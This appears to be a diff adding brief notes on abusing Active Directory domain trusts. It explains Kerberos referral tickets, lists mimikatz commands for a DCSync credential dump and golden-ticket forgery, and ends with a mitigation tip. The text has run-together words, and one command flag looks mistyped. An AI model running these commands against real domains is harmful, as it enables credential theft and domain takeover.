@@ -1,0 +1,18 @@
+AbusingDomainTrusts.txt
+
+At a high level, a domain trust establishes the abilityfor users in one domain to authenticate to resourcesor act as a security principal in another domain, 
+a trust does is link up the authentication systems of twodomains and allows authentication tra ic to flowbetween them through a system of referrals. 
+If a userrequests access to a service principal name (SPN) of aresource that resides outside of the domain they’recurrent in, 
+their domain controller will return aspecial referral ticket that points to the keydistribution center (KDC, in the Windows case thedomain controller) of the foreign domain.
+
+Tools:
+1.mimikatz # lsadump::dcsync /user:<USER>
+2.mimikatz # kerberos::golden /user:<USER>/domain:</DOMAIN> /sid:<OBJECT SECURITYID> /rce:<NTLM HASH> /id:<USER ID>
+
+Solution:
+Remove local admin rights from low privilegedusers in the domain, disable winrm service ifnot required and if the service is necessary,lock down critical enclaves with separateWinRM accounts and permissions.
+
+
+
+
+
